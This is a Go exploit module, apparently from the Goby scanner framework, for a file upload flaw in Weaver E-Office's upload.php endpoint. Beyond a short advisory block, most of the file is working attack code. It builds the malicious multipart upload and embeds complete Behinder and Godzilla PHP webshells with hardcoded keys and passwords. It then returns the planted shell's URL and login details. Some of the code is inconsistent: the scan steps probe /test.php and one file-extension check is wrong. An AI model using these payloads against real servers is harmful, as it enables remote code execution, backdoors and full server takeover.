package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver E-Office webservice-json upload.php File Upload Vulnerability",
    "Description": "<p>Weaver E-office Office Automation System is a professional office software, is for small business or team work platform.</p><p>There is a file upload vulnerability in Weaver E-office Office Automation System. Through this vulnerability, attackers can execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2023-02-01",
    "Author": "WJK",
    "FofaQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\" || header=\"LOGIN_LANG\" || banner=\"LOGIN_LANG\"",
    "GobyQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\" || header=\"LOGIN_LANG\" || banner=\"LOGIN_LANG\"",
    "Level": "2",
    "Impact": "<p>There is a file upload vulnerability in Weaver E-office Office Automation System. Through this vulnerability, attackers can execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed. Users are asked to contact the manufacturer to fix the vulnerability: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.php4",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo(\"123\")?>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "泛微 E-Office webservice-json upload.php 文件上传漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>泛微 E-Office 是泛微公司面向中小型组织推出的OA产品。</p><p>泛微 E-Office 存在文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a><a href=\"http://www.jinher.com/\"></a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>泛微E-office存在文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Weaver E-Office webservice-json upload.php File Upload Vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>Weaver E-office Office Automation System is a professional office software, is for small business or team work platform.</p><p>There is a file upload vulnerability in Weaver E-office Office Automation System. Through this vulnerability, attackers can execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed. Users are asked to contact the manufacturer to fix the vulnerability: <a href=\"https://www.weaver.com.cn/\" target=\"_blank\">https://www.weaver.com.cn/</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>There is a file upload vulnerability in Weaver E-office Office Automation System. Through this vulnerability, attackers can execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10879"
}`
	sendPayloadFlagsqL8 := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		if !strings.HasPrefix(filename, ".php4") {
			filename += ".php4"
		}
		postRequestConfig := httpclient.NewPostRequestConfig("/webservice-json/upload/upload.php")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo)
		postRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryCRMgP7QyN0VotswZ")
		postRequestConfig.Data = "------WebKitFormBoundaryCRMgP7QyN0VotswZ\r\n"
		postRequestConfig.Data += "Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\n"
		postRequestConfig.Data += "Content-Type: application/octet-stream\r\n\r\n"
		postRequestConfig.Data += content + "\r\n"
		postRequestConfig.Data += "------WebKitFormBoundaryCRMgP7QyN0VotswZ--"
		rsp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return nil, err
		}
		if rsp.StatusCode != 200 || !strings.Contains(rsp.Utf8Html, filename) {
			return nil, errors.New("漏洞利用失败")
		}
		filepath := strings.Replace(rsp.Utf8Html, "*", "/", -1)
		getRequestConfig := httpclient.NewGetRequestConfig(fmt.Sprintf("/attachment/%s", filepath))
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayloadFlagsqL8(u, goutils.RandomHexString(16)+".jsp", `<?php echo md5(Gogo); unlink(__FILE__)?>`)
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, "2b72459801b41532e485ad013659eb46")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			content := goutils.B2S(ss.Params["content"])
			filename := goutils.B2S(ss.Params["filename"])
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(16)
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
`
					content = `<?php
@error_reporting(0);
function Decrypt($data)
{
    $key="e45e329feb5d925b"; 
    $bs="base64_"."decode";
	$after=$bs($data."");
	for($i=0;$i<strlen($after);$i++) {
    	$after[$i] = $after[$i]^$key[$i+1&15]; 
    }
    return $after;
}
$post=Decrypt(file_get_contents("php://input"));
eval($post);
?>
`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
`
				}
			}
			rsp, err := sendPayloadFlagsqL8(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			// 资源存在
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			if attackType != "custom" && webshell == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if attackType != "custom" && webshell == "godzilla" {
				expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: php"
			return expResult
		},
	))
}
